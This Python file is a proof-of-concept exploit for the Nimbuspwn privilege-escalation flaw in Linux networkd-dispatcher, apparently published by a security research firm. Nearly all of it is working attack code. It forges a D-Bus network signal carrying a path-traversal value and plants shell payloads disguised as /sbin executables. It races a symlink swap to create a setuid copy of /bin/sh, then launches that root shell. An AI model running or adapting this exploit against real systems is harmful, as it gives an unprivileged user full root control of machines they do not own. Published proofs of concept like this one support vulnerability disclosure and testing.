# Copyright (C) 2022 Will Roberts, Immersive Labs
# https://github.com/Immersive-Labs-Sec/nimbuspwn
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import dbus
import dbus.service
import dbus.mainloop.glib

import os
import shutil
import time
import random


PAYLOAD = """#!/bin/sh
cp /bin/sh /tmp/sh
chmod 4777 /tmp/sh
"""


class Exploit(dbus.service.Object):
    def __init__(self, conn, dirname):
        dbus.service.Object.__init__(self, conn, "/org/freedesktop/network1/link/_32")
        self.PropertiesChanged(
            "org.freedesktop.network1.Link", 
            {
                "OperationalState": f"../../..{dirname}/poc", 
                "AdministrativeState": str(random.randint(0, 100000))
            }, 
            "a")

    @dbus.service.signal(dbus_interface='org.freedesktop.network1.PropertiesChanged')
    def PropertiesChanged(self, test1, test2, test3):
        pass


def trigger_signal(dirname):
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)

    system_bus = dbus.SystemBus()
    name = dbus.service.BusName('org.freedesktop.network1', system_bus)
    o = Exploit(system_bus, dirname)
    o.remove_from_connection()


def prepare_directory(dirname):
    os.mkdir(f"{dirname}")
    
    if not os.path.exists(f"{dirname}"):
        print("Error making directory")
        exit(-1)
    
    os.symlink("/sbin", f"{dirname}/poc.d", True)

    if not os.path.exists(f"{dirname}/poc.d"):
        print("Error symlinking /sbin")
        exit(-1)


def symlink_executables(dirname):
    path = ""
    files = []
    executables = []
    
    for p, _, filenames in os.walk("/sbin"):
        path = p
        for filename in filenames:
            files.append(filename)
    
    for f in files:
        fullpath = f"{path}/{f}"
        if not os.access(fullpath, os.X_OK):
            continue
        
        if not os.stat(fullpath).st_uid == 0:
            continue

        executables.append(f)

    for exe in executables:
        fullpath = f"{dirname}/{exe}"
        with open(fullpath, "w+") as f:
            f.write(PAYLOAD)
        os.chmod(fullpath, 0o777)


def change_symlink(dirname):
    os.remove(f"{dirname}/poc.d")
    os.symlink(f"{dirname}", f"{dirname}/poc.d", True)


def clean_up(dirname):
    shutil.rmtree(f"{dirname}")


if __name__ == '__main__':
    for i in range(10):
        dirname = f"/tmp/nimbuspwn{random.randint(0,10000)}"
        
        print(f"[*] Attempt no. {i+1}...")
        try:
            prepare_directory(dirname)
            symlink_executables(dirname)

            time.sleep(1)

            trigger_signal(dirname)
            change_symlink(dirname)

            time.sleep(1)

            clean_up(dirname)
        except Exception as e:
            print(f"Error: {str(e)}")
            clean_up(dirname)

        if os.path.exists("/tmp/sh"):
            print("[!] Root backdoor obtained! Executing...")
            os.system("/tmp/sh -p")
            break
